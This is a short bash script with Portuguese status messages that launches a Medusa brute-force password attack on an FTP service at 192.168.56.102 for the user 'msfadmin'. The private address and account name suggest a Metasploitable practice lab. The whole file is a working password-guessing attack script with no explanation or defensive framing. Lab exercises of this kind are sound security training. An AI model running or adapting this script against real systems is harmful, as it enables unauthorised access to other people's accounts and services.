#!/bin/bash
TARGET="192.168.56.102"
USER="msfadmin"
WORDLIST="wordlists/passwords.txt"

echo "[*] Iniciando ataque de força bruta FTP com Medusa..."
medusa -h $TARGET -u $USER -P $WORDLIST -M ftp
echo "[*] Ataque concluído."
